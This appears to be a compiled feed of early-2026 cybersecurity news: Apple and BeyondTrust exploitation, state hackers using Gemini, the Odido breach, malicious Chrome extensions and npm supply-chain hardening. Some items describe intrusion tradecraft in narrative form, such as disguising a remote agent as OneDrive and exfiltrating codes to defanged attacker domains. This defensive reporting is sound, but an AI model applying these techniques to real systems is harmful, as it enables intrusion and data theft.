Connectivity disruptions will emerge as a primary tool of coercion. Undersea cables, satellite systems, and positioning/navigation/timing infrastructure are becoming strategic targets, with even limited interference capable of cascading across critical sectors.

Ransomware will fragment further. Declining payments will push threat actors toward shorter attack cycles, lower demands, and disruption-focused tactics designed to compel engagement.

The synthetic identity crisis will deepen. AI-enabled deepfakes and compromised identity verification systems will make business email compromise and social engineering more convincing and scalable.

AI will become the next great attack surface. Prompt-based manipulation will increasingly replace code-based exploits as the preferred intrusion method against AI systems.

Quantum readiness will move from planning to spending. Organizations will begin allocating dedicated budgets for cryptographic inventories, vendor transitions, and post-quantum migration pilots.

Robots and space systems will become contested cyber-physical terrain. In 2026, humanoid robots and space infrastructure will move from experimentation to operational deployment, increasing economic and strategic reliance on network-connected cyber-physical systems.

Intelligence does not eliminate uncertainty; having more access to more data points means nothing without context. Rather, intelligence makes the uncertainty more manageable.

Fragmentation creates complexity. But complexity rewards those who can see connections others miss, such as how risks across geopolitics, cyber operations, and criminal ecosystems converge to shape exposure. That's the purpose of the 2026 State of Security report: not just to catalog threats, but to help leaders reduce surprise, prioritize effectively, and act with confidence.

The full report includes detailed analysis of each threat domain, threat actor profiles, regional risk assessments, and actionable recommendations for building organizational resilience.

[24] Recorded Future - From 27 Steps to 5: How Recorded Future Reimagined Threat Hunting with Autonomous Threat Operations

From 27 Steps to 5: How Recorded Future Reimagined Threat Hunting with Autonomous Threat Operations

The manual operations gap can be a business risk

Manual threat hunting requires 27 steps that burn analyst time

Autonomous Threat Operations can reduce 27 steps to 5

Autonomous operations prove measurable ROI

At Recorded Future, we’re constantly looking for ways to help security teams work more efficiently so they can focus their expertise where it matters most: stopping threats before they impact business.

Over the past few years, as we spent time talking to our customers and observing the ways that their SOCs actually work day to day, we discovered a troubling pattern. Every Monday morning, analysts would begin a new round of threat hunts, manually gathering intelligence, writing queries for different tools, correlating findings, and documenting results. By Friday, they’d complete their reports. Meanwhile, attackers who may have breached the network on Tuesday may have already moved laterally, established persistence, and potentially exfiltrated data.

The manual operations gap

This inefficient approach to threat hunting wasn’t a people problem. It was a process problem.

We identified that traditional manual threat hunting required 27 separate steps, from selecting threat actors and gathering intelligence sources to validating anomalies and writing up reports for stakeholders.

Each of the 27 steps consumed hours of analyst time, and the entire manual workflow created what we now call the manual operations gap—the dangerous window between when threats emerge and when security teams can respond.

Rather than accept this gap as an inevitable reality, we asked ourselves a question: How many more threats could be prevented, and how could we improve organizations’ defenses overall, if we could make manual threat operations autonomous?

Rethinking manual workflows

Threat hunting represented the perfect use case for autonomous operations. It’s a critical security function that’s highly repetitive, spans multiple tools, requires constant updates as threats evolve, and must happen continuously—not just during business hours. We knew that if we could bring autonomous functionality to threat hunting, we could demonstrate a new model for security operations.

The breakthrough came from reimagining the entire workflow around a few core principles: intelligence-driven automation, seamless cross-tool orchestration, and continuous autonomous operations. Instead of analysts manually translating intelligence into queries for each security tool, what if their systems could automatically initiate hunts across SIEM, EDR, and other platforms simultaneously? Instead of analysts having to schedule weekly hunt cycles, what if threat hunting could run 24/7, adapting in real time as new intelligence emerged?

The result of this reimagining is Autonomous Threat Operations and the autonomous threat hunting capability, a new solution that reduces 27 manual steps to as few as 5 largely automated ones, delivering the speed, scale, and effectiveness that the modern threat landscape demands.

Closing the gap with autonomous operations

The transition from manual bottlenecks to autonomous operations isn't just about working faster—it's about working smarter. Security teams need workflows that scale their expertise rather than limit it, systems that integrate their existing investments rather than replace them, and processes that prove measurable ROI to justify continued investment.

Organizations that standardize on intelligence-led operations often demonstrate measurable gains in time to detect and time to respond. They can close the gap between threat emergence and defensive action, transforming security from a reactive cost center into a proactive risk-reduction function.

Want to see exactly how leading organizations are making this transformation? Our new playbook breaks down the specific steps for moving from manual threat hunting to autonomous operations—including the precise methodology for reducing complex, multi-day processes into streamlined workflows that run continuously.

Discover how to eliminate workflow bottlenecks, achieve 24/7 threat coverage, and prove the ROI of your security investments in the autonomous era.

[25] Cyberscoop - Proofpoint acquires Acuvity to tackle the security risks of agentic AI

[TAM METİN - 583 kelime]
Proofpoint announced Thursday it has acquired Acuvity, an AI security startup, as the cybersecurity company moves to address security risks stemming from widespread corporate adoption of agentic AI.

The acquisition strengthens Proofpoint‘s capabilities in monitoring and securing AI-powered systems that are increasingly handling sensitive business functions across enterprises.

Financial terms of the deal were not disclosed, but Ryan Kalember, Proofpoint’s chief strategy officer, told CyberScoop that the acquisition was beyond a pure “technology acquisition,” with Acuvity’s engineering team slated to join the California-based company.

Acuvity specializes in visibility and governance for AI applications, including the ability to track how employees and automated systems interact with external AI services and protect custom AI models developed within organizations. The startup’s platform monitors AI usage across multiple deployments, from web browsers to specialized infrastructure including Model Context Protocol (MCP) servers and locally installed AI tools.

The deal reflects growing concern among enterprises about security gaps created as organizations deploy agentic AI across departments, like software development, customer support, finance, and legal operations. These systems increasingly access sensitive data and execute tasks previously handled exclusively by humans.

Additionally, AI-specific attack vectors such as prompt injection and model manipulation have emerged as potential threats that traditional cybersecurity tools were not designed to address.

Kalember said CISOs are seeing the potential risk combined with agentic AI growth, and are sensing the need to maintain governance without impeding innovation, particularly as the pace of AI adoption has outstripped many companies’ ability to secure these systems effectively.

“It has definitely been a pivot from, ‘I got to be able to stop prompt injection’ to ‘I have to be able to figure out what the AI is even doing,’” he told CyberScoop.

Last May, Proofpoint acquired Hornetsecurity Group, a Germany-based provider of Microsoft 365 security services, in a deal reportedly valued at more than $1 billion. Kalember told CyberScoop he sees Acuvity helping small- and medium-sized organizations that leverage Hornetsecurity’s offerings to boost its AI security.

“That is going to be a world in which, independent of the size of the organization, they are going to very much leverage AI, and some of that will be built into the tools like M365 that is tightly coupled with the Hornetsecurity architecture,” Kalember said.The acquisition follows a theme within the industry where larger security companies are buying AI-focused security startups. Just last week, data security firm Varonis acquired AI security firm AllTrue.ai for $150 million.

[26] Cyberscoop - Apple discloses first actively exploited zero-day of 2026

[TAM METİN - 527 kelime]
Apple disclosed a zero-day vulnerability Wednesday that the vendor warned was previously “exploited in an extremely sophisticated attack against specific targeted individuals,” the company said in a security update.

The memory-corruption vulnerability — CVE-2026-20700 — affects iPhones and iPads and was exploited on devices running versions of iOS before iOS 26. The Cybersecurity and Infrastructure Security Agency added the defect to its known exploited vulnerabilities catalog Thursday.

The disclosure marks the first zero-day reported by Apple since late 2025, and the first Apple defect flagged as actively exploited by CISA this year.

“An attacker with memory write capability may be able to execute arbitrary code,” the company said.

Apple, which typically shares limited details about in-the-wild exploitation of zero-days, noted the latest zero-day, similar to others it disclosed last year, was exploited by sophisticated attackers targeting distinct people.

The company did not immediately respond to a request for comment and did not describe the nature or objectives of the attacks.

Caitlin Condon, vice president of security research at VulnCheck, said the zero-day was likely exploited as part of a highly targeted spyware or surveillance attack on a very small number of individuals’ devices.

The zero-day vulnerability, which was discovered by Google Threat Intelligence Group, affects dyld, Apple’s open-source dynamic link editor that acts as a core system component to securely load applications on users’ devices.

Apple said a pair of additional vulnerabilities affecting WebKit — CVE-2025-14174 and CVE-2025-43529 — were previously disclosed in response to attacks involving CVE-2026-20700.

The company did not describe how the three vulnerabilities are related, but previously noted CVE-2025-43529 was “exploited in an extremely sophisticated attack against specific targeted individuals.”

All three of the memory-corruption defects affect mobile operating systems, “where sophisticated zero-day attacks are commonly employed to surveil individuals, whether those are political dissidents, journalists, public figures or other high-value targets,” Condon said.

“Memory-corruption exploits are also commonly seen in sophisticated attacks, as they’re tricky to exploit reliably but provide elevated access,” she added.

Apple’s security updates for iOS 26.3 and iPadOS 26.3 addresses 38 vulnerabilities total, but CVE-2026-20700 is the only defect it disclosed as actively exploited prior to public disclosure.

[27] Cyberscoop - Google finds state-sponsored hackers use AI at ‘all stages’ of attack cycle 
────────────────────────────────────────────────────────────────────────────────
Tarih: Thu, 12 Feb 2026 21:24:46 +0000
Link: https://cyberscoop.com/state-hackers-using-gemini-google-ai/

[TAM METİN - 733 kelime]
A new report from Google found evidence that state-sponsored hacking groups have leveraged AI tool Gemini at nearly every stage of the cyber attack cycle.

The research underscores how AI tools have matured in their cyber offensive capabilities, even as it doesn’t reveal novel or paradigm shifting uses of the technology.

John Hultquist, chief analyst at Google’s Threat Intelligence Group, told CyberScoop that many countries still appear to be experimenting with AI tools, determining where they best fit into the attack chain and provide more benefit than friction.

“Nobody’s got everything completely worked out,” Hultquist said. “They’re all trying to figure this out and that goes for attacks on AI, too.”

But the report also reveals that frontier AI models can build speed, scale and sophistication into a myriad of hacking tasks, and state-sponsored hacking groups are taking advantage.

Gemini was a useful, dynamic and convenient tool for many tasks, helping threat actors in a variety of different ways. In nearly all cases, Google’s reporting suggests that state-sponsored actors relied on Gemini as one tool among many, using it for specific purposes such as automating routine processes, conducting research or reconnaissance and experimenting with malware.

One North Korean group used it to synthesize open-source intelligence about job roles and salary information at cybersecurity and defense companies. Another North Korean group consulted it “multiple days a week” for technical support, using it to troubleshoot problems and generate new malware code when they got stuck during an operation. One Iranian APT used Gemini to “significantly augment reconnaissance” techniques against targeted victims. China, Russia, Iran and North Korea all also used Gemini to create fake articles, personas, and other assets for information operations.

“What’s so interesting about this capability is it’s going to have an effect across the entire intrusion cycle,” Hultquist said.

There are no instances of state groups using Gemini to automate large portions of a cyber attack, like a Chinese-government backed campaign identified by Anthropic last year. It suggests threat actors may still be struggling to implement fully or mostly-automated hacks using AI.

Hultquist said that some state groups, particularly those focused on espionage, may not find the speed and scale advantages of agentic AI useful if it results in louder, more detectable operations. In fact, while state actors continue to experiment with AI models, he believes on average these developments will help smaller cybercriminal outfits more than state-sponsored hackers.

But that could change in the future. Frontier AI companies like Anthropic and cybersecurity startups like XBOW have already developed models with powerful defensive cybersecurity capabilities in vulnerability scanning, reconnaissance and automation. Foreign governments with similar technology could use those same features for offensive hacking, as Chinese actors did with Claude before being discovered.

In December, the UK AI Security Institute’s inaugural report on frontier AI trends found that Al capabilities are improving rapidly across all tested domains, and particularly in cybersecurity.

And the gap between frontier and free, open-source models is shrinking. According to the institute, open-source AI models can now catch up and provide similar capabilities within 4-8 months of a frontier model release.

“The duration of cyber tasks that Al systems can complete without human direction is also rising steeply, from less than 10 minutes in early 2023 to over an hour by mid-2025,” the institute said in its Frontier AI Trends Report in December.

[28] The Register - Top Dutch telco Odido admits 6.2M customers caught in contact system caper

Top Dutch telco Odido admits 6.2M customers caught in contact system caper

Names, addresses, bank account numbers accessed – but biz insists passwords and call data untouched

The Netherlands' largest mobile network operator (MNO) has admitted that a breach of its customer contact system may have affected around 6.2 million people.

Odido said that attackers gained access to a range of personal data, including names, home and email addresses, phone numbers, dates of birth, bank account numbers, and ID document details.

The telco insisted that attackers could never have seen passwords, call details, billing or location data, or scans of the ID documents.

It spotted the first signals indicating a breach over the weekend of February 7-8 and promptly reported the incident to the Dutch Data Protection Authority.

Odido said the stolen data has not been published, but warned that it could appear online at some point in the future.

Around 6.2 million people were affected by this attack in some way, the telco told local news media, including its own customers and those of Ben, another MNO owned by Odido. Simpel, a low-budget MNO also under Odido's management, was unaffected.

The company is in the process of informing all affected individuals, either via email (info@mail.odido.nl) or SMS. This message will be tailored to each customer, telling them exactly what personal data was stolen.

In its disclosure, Odido also included tips about what customers should be aware of following the breach, such as scams attackers may attempt using the stolen data for financial gain.

Because names, addresses, phone numbers, and bank account numbers were included in the stolen data, Odido said that cybercriminals may use this to impersonate the telco, the customer's bank, or another third party.

Odido also advised customers about the different ways they can verify a caller's identity if they say they're calling from a bank, and to be wary of fake invoices with company branding, trying to get customers to pay the criminals directly.

CEO Søren Abildgaard said Odido "immediately took additional security measures" after shutting down the attacker's access, as well as informing the data regulator.

"Odido has been affected by a cyberattack, in which customer data has been impacted," said Abildgaard in a letter to customers. "This involves personal data originating from a customer contact system used by Odido. No passwords, call details, or billing data are involved.

"We deeply regret this incident and are fully committed to limiting the impact of this incident and providing our customers with all necessary support. It is important to emphasize that our operational services have not been affected; customers can continue to call, use the internet, and watch TV safely.

"Unauthorized access to the system was ended as quickly as possible. In addition, Odido has engaged external cybersecurity experts to support the implementation of additional security measures as part of the response to this incident."

The Register approached Odido for more information. ®

Who's the bossware? Ransomware slingers like employee monitoring tools, too

As if snooping on your workers wasn't bad enough

Your supervisor may like using employee monitoring apps to keep tabs on you, but crims like the snooping software even more. Threat actors are now using legit bossware to blend into corporate networks and attempt ransomware deployment.

In late January and early February, the Huntress response team spotted two intrusions in which criminals chained Net Monitor for Employees Professional with remote monitoring and management (RMM) tool SimpleHelp, and then attempted to deploy ransomware on the victims' computers.

While the crims were ultimately unsuccessful, the security incidents highlight how miscreants love to use legitimate, commercial software for nefarious purposes because it makes it easier for them to hide inside enterprise IT environments.

"RMMs and employee monitoring tools blend in amongst legitimate signed binaries," Michael Tigges, senior security operations analyst at Huntress, told The Register, adding that "this is a rare case of the employee monitoring software being co-opted for subsequent access."

While neither of the victims' employers uses Net Monitor, repurposing this type of employee monitoring software falls into the "same category of RMM abuse," Tigges said. "Delineating which may be malicious and benign at first glance is exceedingly difficult. Adversaries know this as well."

The victims, we're told, were from different industry sectors, and "likely targets of opportunity rather than any specifically targeted group," he added.

This is a rare case of the employee monitoring software being co-opted for subsequent access

Tigges points out that "there are legitimate use cases for employee monitoring software - chiefly around data loss prevention."

This particular brand of bossware, however, does a whole lot more than passive screen monitoring. It can also establish remote shell connections and remotely execute commands on users' desktops. That makes it ideal for crims to use, even without modifying or infecting the installers.

"Threat actors leveraged this capability for hands-on-keyboard reconnaissance, additional tooling delivery, and deploying secondary remote access channels, effectively turning an employee monitoring tool into a fully functional RAT (remote access trojan)," Tigges and fellow threat hunters Anna Pham, Dray Agha, and Anton Ovrutsky wrote in a Wednesday blog.

As The Register previously reported, spying on workers is also bad for morale and doesn't inspire loyalty to the company, not to mention that employer-sanctioned RATs are creepy as all hell.

Here's what went down

In the first case that the Huntress team observed in late January, the attacker somehow installed Net Monitor for Employees on the victim's machine. Huntress doesn't know how the intruder gained initial access.

But once they had broken in, the criminals set to work manipulating user accounts via multiple net commands. This included attempting to identify valid usernames, reset passwords, and create new admin-user accounts on the host.

"As we kept pulling on investigative threads, we observed the 'Net Monitor for Employees' terminal pulling down a file via PowerShell named vhost.exe from the IP address of 160.191.182[.]41," the threat hunters wrote.

The executable turned out to be SimpleHelp, which the attacker then used in multiple attempts to tamper with Windows Defender. When this wasn't successful, the intruder tried to deploy multiple versions of Crazy ransomware linked to VoidCrypt.

In the second incident, which happened in early February, the attacker used a compromised third-party SSL VPN account to gain initial access to the victim's computer. Next, they connected to a domain controller using remote desktop protocol, launched a PowerShell session, and installed the Net Monitor agent, configuring the reverse connection to call back to an attacker-controlled console.

Net Monitor allows users to customize the service and process names, and the intruder took advantage of this to disguise the agent as Microsoft OneDrive, registering the service as OneDriveSvc, naming the process OneDriver.exe, and renaming the running binary to svchost.exe.

Ransomware crews add 'EDR killers' to their arsenal – and some aren't even malware

Then, the intruder installed SimpleHelp and configured it to monitor for keywords that would indicate cryptocurrency wallets, exchanges, blockchain explorers, and payment platforms. This, Huntress notes, indicates "the threat actor's financial motivation extends beyond ransomware to direct cryptocurrency theft."

The SimpleHelp agent also monitored for remote tool access keywords including RDP, AnyDesk, TeamViewer, and VNC.

Meanwhile, they used Net Monitor for Employees Professional to perform network reconnaissance on the compromised domain controller, probe internal network segments, and map out the network settings.

Huntress says shared infrastructure used in both cases, plus the reuse of the vhost.exe filename and overlapping IP addresses, "strongly suggest" a single attacker or group behind the two intrusions.

And to prevent becoming the next victim, turn on multi-factor authentication (MFA) on all remote access services and external-facing applications, and limit remote access to only those users and systems that require it to do their jobs.

The security analysts also suggest conducting regular audits of all third-party RMM tools and employee monitoring software, and monitoring for any unusual process execution chains. ®

[30] The Register - Apple patches decade-old iOS zero-day, possibly exploited by commercial spyware

Apple patches decade-old iOS zero-day, possibly exploited by commercial spyware

Flaw abused 'in an extremely sophisticated attack against specific targeted individuals'

Apple patched a zero-day vulnerability affecting every iOS version since 1.0, used in what the company calls an "extremely sophisticated attack" against targeted individuals.

CVE-2026-20700, discovered by Google's Threat Analysis Group, affects dyld - Apple's dynamic linker - and allows attackers with memory write capability to execute arbitrary code. Apple said the flaw was exploited in the wild and may have been part of an exploit chain.

Its advisory stated: "An attacker with memory write capability may be able to execute arbitrary code. Apple is aware of a report that this issue may have been exploited in an extremely sophisticated attack against specific targeted individuals on versions of iOS before iOS 26."

Google's researchers also referenced two December vulnerabilities in their report that both carry 8.8 CVSS scores.

CVE-2025-14174 is an out-of-bounds memory access flaw in Google Chrome's ANGLE graphics engine on Mac that could be exploited through a malicious webpage.

The other, CVE-2025-43529, is a use-after-free leading to code execution.

Brian Milbier, deputy CISO at Huntress, said: "Think of dyld as the doorman for your phone. Every single app that wants to run must first pass through this doorman to be assembled and given permission to start.

"Usually, the doorman checks credentials and places apps in a high-security 'sandbox' where they can't touch your private data. This vulnerability allows an attacker to trick the doorman into handing over a master key before security checks even begin."

Stalkerware slinger pleads guilty for selling snooper software to suspicious spouses

Apple, Google forced to issue emergency 0-day patches

Two Android 0-day bugs disclosed and fixed, plus 105 more to patch

By chaining this with WebKit flaws Apple also addressed in the iOS 26.3 update, "attackers have created a 'zero-click' or 'one-click' path to total control. They use a fake ID to bypass the front gate – your browser – and then exploit the doorman's flaw to take over the entire building," Milbier added.

"This level of sophistication resembles other exploits developed by the commercial surveillance industry. These are private companies that also developed prominent spyware tools like Pegasus and Predator. They sell these types of exploits or tools to government clients. While some updates in this patch address minor issues, such as data leakage from physical access, the dyld/WebKit chain is in a different league. iOS 26.3 closes a door that has been unlocked for over a decade."

Apple's updates for iOS and iPadOS also feature a host of other fixes for various bugs, including flaws that grant root access and disclose sensitive user information, but CVE-2026-20700 is the only one it said was exploited in the wild. ®

[1] The Hacker News - Malicious Chrome Extensions Caught Stealing Business Data, Emails, and Browsing History
────────────────────────────────────────────────────────────────────────────────

[TAM METİN - 1367 kelime]
Cybersecurity researchers have discovered a malicious Google Chrome extension that's designed to steal data associated with Meta Business Suite and Facebook Business Manager.

The extension, named CL Suite by @CLMasters (ID: jkphinfhmfkckkcnifhjiplhfoiefffl), is marketed as a way to scrape Meta Business Suite data, remove verification pop-ups, and generate two-factor authentication (2FA) codes. The extension has 33 users as of writing. It was first uploaded to the Chrome Web Store on March 1, 2025.

However, the browser add-on also exfiltrates TOTP codes for Facebook and Meta Business accounts, Business Manager contact lists, and analytics data to infrastructure controlled by the threat actor, Socket said.

"The extension requests broad access to meta.com and facebook.com and claims in its privacy policy that 2FA secrets and Business Manager data remain local," security researcher Kirill Boychenko said.

"In practice, the code transmits TOTP seeds and current one-time security codes, Meta Business 'People' CSV exports, and Business Manager analytics data to a backend at getauth[.]pro, with an option to forward the same payloads to a Telegram channel controlled by the threat actor."

By targeting users of Meta Business Suite and Facebook Business Manager, the threat actor behind the operation has leveraged the extension to conduct data collection and exfiltration without users' knowledge or consent.

While the extension does not have capabilities to steal password-related information, the attacker could obtain such information beforehand from other sources, such as infostealer logs or credential dumps, and then use the stolen codes to gain unauthorized access to victims' accounts.

The full scope of the malicious add-on's capabilities is listed below -

Steal TOTP seed (a unique, alphanumeric code that's used to generate time-based one-time passwords) and 2FA code

Target Business Manager "People" view by navigating to facebook[.]com and meta[.]com and build a CSV file with names, email addresses, roles and permissions, and their status and access details.

Enumerate Business Manager-level entities and their linked assets and build a CSV file of Business Manager IDs and names, attached ad accounts, connected pages and assets, and billing and payment configuration details.

Socket warned that despite the low number of installs, the extension gives the threat actor enough information to identify high-value targets and mount follow-on attacks.

"CL Suite by @CLMasters shows how a narrow browser extension can repackage data scraping as a 'tool' for Meta Business Suite and Facebook Business Manager," Boychenko said.

"Its people extraction, Business Manager analytics, popup suppression, and in-browser 2FA generation are not neutral productivity features, they are purpose-built scrapers for high-value Meta surfaces that collect contact lists, access metadata, and 2FA material straight from authenticated pages."

Chrome Extensions Hijack VKontakte Accounts

The disclosure comes as Koi Security found that about 500,000 VKontakte users have had their accounts silently hijacked through Chrome extensions masquerading as VK customization tools. The large-scale campaign has been codenamed VK Styles.

The malware embedded in the extensions is designed to engage in active account manipulation by automatically subscribing users to the attacker's VK groups, resetting account settings every 30 days to override user preferences, manipulating Cross-Site Request Forgery (CSRF) tokens to bypass VK's security protections, and maintaining persistent control.

The activity has been traced to a threat actor operating under the GitHub username 2vk, who has relied on VK's own social network to distribute malicious payloads and build a follower base through forced subscriptions. The names of the extensions are listed below -

VK Styles - Themes for vk.com (ID: ceibjdigmfbbgcpkkdpmjokkokklodmc)

VK Music - audio saver (ID: mflibpdjoodmoppignjhciadahapkoch)

Music Downloader - VKsaver (ID: lgakkahjfibfgmacigibnhcgepajgfdb)

vksaver - music saver vk (ID: bndkfmmbidllaiccmpnbdonijmicaafn)

VKfeed - Download Music and Video from VK (ID: pcdgkgbadeggbnodegejccjffnoakcoh)

One of the defining traits of the campaign is the use of a VK profile's ("vk[.]com/m0nda") HTML metadata tags as a dead drop resolver to conceal the next-stage payload URLs and, therefore, evade detection. The next-stage payload is hosted in a public repository named "-" that's associated with 2vk. Present in the payload is obfuscated JavaScript that's injected into every VK page the victim visits.

The repository is still accessible as of writing, with the file, simply named "C," receiving a total of 17 commits between June 2025 and January 2026, as the operator refined and added new functionality.

"Each commit shows deliberate refinement," security researcher Ariel Cohen said. "This isn't sloppy malware - it's a maintained software project with version control, testing, and iterative improvements."

VK Styles has primarily affected Russian-speaking users, who are VK's main demographic, as well as users across Eastern Europe, Central Asia, and Russian diaspora communities globally. The campaign is assessed to be active since at least June 22, 2025, when the initial version of the payload was pushed to the "-" repository.

Fake AI Chrome Extensions Steal Credentials, Emails

The findings also coincide with the discovery of another coordinated campaign dubbed AiFrame, where a cluster of 32 browser add-ons advertised as artificial intelligence (AI) assistants for summarization, chat, writing, and Gmail assistance are being used to siphon sensitive data. These extensions have been collectively installed by more than 260,000 users.

"While these tools appear legitimate on the surface, they hide a dangerous architecture: instead of implementing core functionality locally, they embed remote, server-controlled interfaces inside extension-controlled surfaces and act as privileged proxies, granting remote infrastructure access to sensitive browser capabilities," LayerX researcher Natalie Zargarov said.

The names of the malicious extensions are as follows -

Chat GPT for Gmail (ID: fpmkabpaklbhbhegegapfkenkmpipick)

Once installed, these extensions render a full-screen iframe overlay pointing to a remote domain ("claude.tapnetic[.]pro"), allowing the attackers to remotely introduce new capabilities without requiring a Chrome Web Store update. When instructed by the iframe, the add-ons query the active browser tab and invoke a content script to extract readable article content using Mozilla's Readability library.

The malware also supports the capability to start speech recognition and exfiltrate the resulting transcript to the remote page. What's more, a smaller set of the extensions contain functionality to specifically target Gmail by reading visible email content directly from the document object model (DOM) when a victim visits mail.google[.]com.

"When Gmail-related features such as AI-assisted replies or summaries are invoked, the extracted email content is passed into the extension's logic and transmitted to third-party backend infrastructure controlled by the extension operator," LayerX said. "As a result, email message text and related contextual data may be sent off-device, outside of Gmail’s security boundary, to remote servers."

287 Chrome Extensions Exfiltrate Browsing History

The developments show how web browser extensions are increasingly being abused by bad actors to harvest and exfiltrate sensitive data by passing them off as seemingly legitimate tools and utilities.

A report published by Q Continuum last week found a huge collection of 287 Chrome extensions that exfiltrate browsing history to data brokers. These extensions have 37.4 million installations, representing roughly 1% of the global Chrome userbase.

"It was shown in the past that Chrome extensions are used to exfiltrate user browser history that is then collected by data brokers such as Similarweb and Alexa," the researcher said.

Given the risks involved, users are recommended to adopt a minimalist approach by only installing necessary, well-reviewed tools from official stores. It's also essential to periodically audit installed extensions for any signs of malicious behavior or excessive permission requests.

Other ways that users and organizations can ensure greater security include using separate browser profiles for sensitive tasks and implementing extension allowlisting to block those that are malicious or non-compliant.

[2] The Hacker News - npm’s Update to Harden Their Supply Chain, and Points to Consider
────────────────────────────────────────────────────────────────────────────────
Tarih: Fri, 13 Feb 2026 16:15:00 +0530
Link: https://thehackernews.com/2026/02/npms-update-to-harden-their-supply.html

[TAM METİN - 833 kelime]
In December 2025, in response to the Sha1-Hulud incident, npm completed a major authentication overhaul intended to reduce supply-chain attacks. While the overhaul is a solid step forward, the changes don’t make npm projects immune from supply-chain attacks. npm is still susceptible to malware attacks – here’s what you need to know for a safer Node community.

Let’s start with the original problem

Historically, npm relied on classic tokens: long-lived, broadly scoped credentials that could persist indefinitely. If stolen, attackers could directly publish malicious versions to the author’s packages (no publicly verifiable source code needed). This made npm a prime vector for supply-chain attacks. Over time, numerous real-world incidents demonstrated this point. Shai-Hulud, Sha1-Hulud, and chalk/debug are examples of recent, notable attacks.

To address this, npm made the following changes:

npm revoked all classic tokens and defaulted to session-based tokens instead. The npm team also improved token management. Interactive workflows now use short-lived session tokens (typically two hours) obtained via npm login, which defaults to MFA for publishing.

The npm team also encourages OIDC Trusted Publishing, in which CI systems obtain short-lived, per-run credentials rather than storing secrets at rest.

In combination, these practices improve security. They ensure credentials expire quickly and require a second factor during sensitive operations.

Two important issues remain

First, people need to remember that the original attack on tools like ChalkJS was a successful MFA phishing attempt on npm’s console. If you look at the original email attached below, you can see it was an MFA-focused phishing email (nothing like trying to do the right thing and still getting burned). The campaign tricked the maintainer into sharing both the user login and one-time password. This means in the future, similar emails could get short-lived tokens, which still give attackers enough time to upload malware (since that would only take minutes).

Second, MFA on publish is optional. Developers can still create 90-day tokens with MFA bypass enabled in the console, which are extremely similar to the classic tokens from before.

These tokens allow you to read and write to a token author’s maintained packages. This means that if bad actors gain access to a maintainer’s console with these token settings, they can publish new, malicious packages (and versions) on that author’s behalf. This circles us back to the original issue with npm before they adjusted their credential policies.

To be clear, more developers using MFA on publish is good news, and future attacks should be fewer and smaller. However, making OIDC and MFA on-publish optional still leaves the core issue unresolved.

In conclusion, if (1) MFA phishing attempts to npm’s console still work and (2) access to the console equals access to publish new packages/versions, then developers need to be aware of the supply-chain risks that still exist.

In the spirit of open source security, here are three recommendations that we hope GitHub and npm will consider in the future.

Ideally, they continue to push for the ubiquity of OIDC in the long term. OIDC is very hard to compromise and would almost completely erase the issues surrounding supply-chain attacks.

More realistically, enforcing MFA for local package uploads (either via an email code or a one-time password) would further reduce the blast radius of worms like Shai-Hulud. In other words, it would be an improvement to not allow custom tokens that bypass MFA.

At a minimum, it would be nice to add metadata to package releases, so developers can take precautions and avoid packages (or maintainers) who do not take supply chain security measures.

In short, npm has taken an important step forward by eliminating permanent tokens and improving defaults. Until short-lived, identity-bound credentials become the norm — and MFA bypass is no longer required for automation — supply-chain risk from compromised build systems remains materially present.

This entire time, we’ve been talking about supply-chain attacks by uploading packages to npm on a maintainer’s behalf. If we could build every npm package from verifiable upstream source code rather than downloading the artifact from npm, we’d be better off. That’s exactly what Chainguard does for its customers with Chainguard Libraries for JavaScript.

We’ve looked at the public database for compromised packages across npm and discovered that for 98.5% of malicious packages, the malware was not present in the upstream source code (just the published artifact). This means an approach of building from source would reduce your attack surface by some 98.5%, based on past data, because Chainguard’s JavaScript repository would never publish the malicious versions available on npm.

In an ideal world, customers are most secure when they use Chainguard Libraries and apply the recommendations above. Per the “Swiss cheese model of security,” all of these features are layers of additive security measures, and companies would be best off using a combination of them.

If you’d like to learn more about Chainguard Libraries for JavaScript, reach out to our team.

[3] The Hacker News - Researchers Observe In-the-Wild Exploitation of BeyondTrust CVSS 9.9 Vulnerability
────────────────────────────────────────────────────────────────────────────────
Tarih: Fri, 13 Feb 2026 14:04:00 +0530
Link: https://thehackernews.com/2026/02/researchers-observe-in-wild.html

[TAM METİN - 864 kelime]
Threat actors have started to exploit a recently disclosed critical security flaw impacting BeyondTrust Remote Support (RS) and Privileged Remote Access (PRA) products, according to watchTowr.

"Overnight we observed first in-the-wild exploitation of BeyondTrust across our global sensors," Ryan Dewhurst, head of threat intelligence at watchTowr, said in a post on X. "Attackers are abusing get_portal_info to extract the x-ns-company value before establishing a WebSocket channel."

The vulnerability in question is CVE-2026-1731 (CVS score: 9.9), which could allow an unauthenticated attacker to achieve remote code execution by sending specially crafted requests.

BeyondTrust noted last week that successful exploitation of the shortcoming could allow an unauthenticated remote attacker to execute operating system commands in the context of the site user, resulting in unauthorized access, data exfiltration, and service disruption.

It has been patched in the following versions -

Remote Support - Patch BT26-02-RS, 25.3.2 and later

Privileged Remote Access - Patch BT26-02-PRA, 25.1.1 and later

The use of CVE-2026-1731 demonstrates how quickly threat actors can weaponize new vulnerabilities, significantly shrinking the window for defenders to patch critical systems.

CISA Adds 4 Flaws to KEV Catalog

The development comes as the U.S. Cybersecurity and Infrastructure Security Agency (CISA) added four vulnerabilities to its Known Exploited Vulnerabilities (KEV) catalog, citing evidence of active exploitation. The list of vulnerabilities is as follows -

CVE-2026-20700 (CVSS score: 7.8) - An improper restriction of operations within the bounds of a memory buffer vulnerability in Apple iOS, macOS, tvOS, watchOS, and visionOS that could allow an attacker with memory write capability to execute arbitrary code.

CVE-2025-15556 (CVSS score: 7.7) - A download of code without an integrity check vulnerability in Notepad++ that could allow an attacker to intercept or redirect update traffic to download and execute an attacker-controlled installer and lead to arbitrary code execution with the privileges of the user.

CVE-2025-40536 (CVSS score: 8.1) - A security control bypass vulnerability in SolarWinds Web Help Desk that could allow an unauthenticated attacker to gain access to certain restricted functionality.

CVE-2024-43468 (CVSS score: 9.8) - An SQL injection vulnerability in Microsoft Configuration Manager that could allow an unauthenticated attacker to execute commands on the server and/or underlying database by sending specially crafted requests.

It's worth noting that CVE-2024-43468 was patched by Microsoft in October 2024 as part of its Patch Tuesday updates. It's currently unclear how this vulnerability is being exploited in real-world attacks. Nor is there any information about the identity of the threat actors exploiting the flaw and the scale of such efforts.

The addition of CVE-2024-43468 to the KEV catalog follows a recent report from Microsoft about a multi‑stage intrusion that involved the threat actors exploiting internet‑exposed SolarWinds Web Help Desk (WHD) instances to obtain initial access and move laterally across the organization's network to other high-value assets.

